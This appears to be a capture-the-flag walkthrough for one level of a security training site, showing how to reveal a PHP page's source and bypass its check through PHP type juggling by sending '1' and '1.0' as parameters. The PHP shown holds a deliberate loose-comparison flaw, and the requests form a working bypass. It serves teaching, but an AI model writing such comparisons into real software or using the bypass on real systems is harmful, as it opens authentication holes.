# Level-18

Level18-19 (https://matrix.voorivex.academy/dangEr-level-100)

send this request:

```text
https://matrix.voorivex.academy/dangEr-level-100?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

function compareStrings($str1, $str2) {
    if (strlen($str1) != strlen($str2)) {
        return false;
    }

    $length = strlen($str1);
    for ($i = 0; $i < $length; $i++) {
        if ($str1[$i] != $str2[$i]) {
            return false;
        }
    }

    return true;
}

$code1 = $_GET['code1'];
$code2 = $_GET['code2'];

if (compareStrings($code1, $code2) != true) {
    if ($code1 == $code2) {
        require_once('next.php');
        die($next);
    }
}

?>
```

it is using type juggling in this line :
```php
if ($code1 == $code2)
```

we must give it two parameter which are different in string length but equal in math
something like `1` and `1.0` so send this request :

```text
https://matrix.voorivex.academy/dangEr-level-100/?code1=1&code2=1.0
``` 

you will get this :

```text
/m0re-dangeR-needed
```

go to :

```text
https://matrix.voorivex.academy/m0re-dangeR-needed
```
